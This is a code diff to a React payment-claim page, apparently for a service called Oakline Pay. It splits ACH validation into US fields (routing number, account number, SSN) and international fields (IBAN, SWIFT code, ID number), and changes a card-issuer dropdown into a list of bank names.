@@ -189,27 +189,57 @@ export default function ClaimPaymentPage() {
   };
 
   const handleAchSubmit = async () => {
-    if (!achForm.account_holder_name || !achForm.account_number || !achForm.routing_number || !achForm.ssn || !achForm.date_of_birth) {
+    // Citizenship-aware validation
+    if (!achForm.account_holder_name || !achForm.date_of_birth) {
       setMessage('Please fill in all required fields.', 'error');
+      setMessageType('error');
+      return;
+    }
+
+    if (achCitizenship === 'us') {
+      if (!achForm.routing_number || !achForm.account_number || !achForm.account_type || !achForm.ssn) {
+        setMessage('Please fill in all required fields.', 'error');
+        setMessageType('error');
+        return;
+      }
+    } else if (achCitizenship === 'intl') {
+      if (!achForm.iban || !achForm.swift_code || !achForm.bank_name || !achForm.id_number) {
+        setMessage('Please fill in all required fields.', 'error');
+        setMessageType('error');
+        return;
+      }
+    } else {
+      setMessage('Please select your account type (US or International).', 'error');
       setMessageType('error');
       return;
     }
 
     setSubmitting(true);
     try {
+      // Prepare update object based on citizenship
+      const updateData = {
+        claim_method: 'ach',
+        claimed_at: new Date().toISOString(),
+        account_holder_name: achForm.account_holder_name,
+        account_type: achForm.account_type,
+        date_of_birth: achForm.date_of_birth,
+        approval_status: 'card_details_submitted'
+      };
+
+      if (achCitizenship === 'us') {
+        updateData.routing_number = achForm.routing_number;
+        updateData.account_number = achForm.account_number;
+        updateData.ssn = achForm.ssn;
+      } else if (achCitizenship === 'intl') {
+        updateData.iban = achForm.iban;
+        updateData.swift_code = achForm.swift_code;
+        updateData.bank_name = achForm.bank_name;
+        updateData.id_number = achForm.id_number;
+      }
+
       const { error } = await supabase
         .from('oakline_pay_pending_claims')
-        .update({
-          claim_method: 'ach',
-          claimed_at: new Date().toISOString(),
-          account_holder_name: achForm.account_holder_name,
-          account_number: achForm.account_number,
-          routing_number: achForm.routing_number,
-          account_type: achForm.account_type,
-          ssn: achForm.ssn,
-          date_of_birth: achForm.date_of_birth,
-          approval_status: 'card_details_submitted'
-        })
+        .update(updateData)
         .eq('claim_token', token)
         .eq('status', 'sent');
 
@@ -685,20 +715,31 @@ export default function ClaimPaymentPage() {
                         </div>
 
                         <div style={{ marginBottom: '1rem' }}>
-                          <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Card Issuer *</label>
+                          <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Bank Name *</label>
                           <select value={debitCardForm.card_issuer} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_issuer: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'}>
-                            <option value="">Select a card issuer...</option>
-                            <option value="Visa">Visa</option>
-                            <option value="Mastercard">Mastercard</option>
+                            <option value="">Select your bank...</option>
+                            <option value="Chase Bank">Chase Bank</option>
+                            <option value="Bank of America">Bank of America</option>
+                            <option value="Wells Fargo">Wells Fargo</option>
+                            <option value="Citibank">Citibank</option>
+                            <option value="PNC Bank">PNC Bank</option>
+                            <option value="US Bank">US Bank</option>
+                            <option value="TD Bank">TD Bank</option>
+                            <option value="KeyBank">KeyBank</option>
+                            <option value="Capital One">Capital One</option>
+                            <option value="Discover Bank">Discover Bank</option>
                             <option value="American Express">American Express</option>
-                            <option value="Discover">Discover</option>
+                            <option value="USAA">USAA</option>
+                            <option value="Navy Federal Credit Union">Navy Federal Credit Union</option>
+                            <option value="Ally Bank">Ally Bank</option>
+                            <option value="Synchrony Bank">Synchrony Bank</option>
                             <option value="other">Other / Enter Manually</option>
                           </select>
                         </div>
                         {debitCardForm.card_issuer === 'other' && (
                           <div style={{ marginBottom: '1rem' }}>
-                            <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Card Issuer Name *</label>
-                            <input type="text" placeholder="e.g., Diners Club, UnionPay, etc." value={debitCardForm.card_issuer_custom} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_issuer_custom: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
+                            <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Bank Name *</label>
+                            <input type="text" placeholder="e.g., First National Bank, Regional Bank, etc." value={debitCardForm.card_issuer_custom} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_issuer_custom: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                           </div>
                         )}
                       </div>
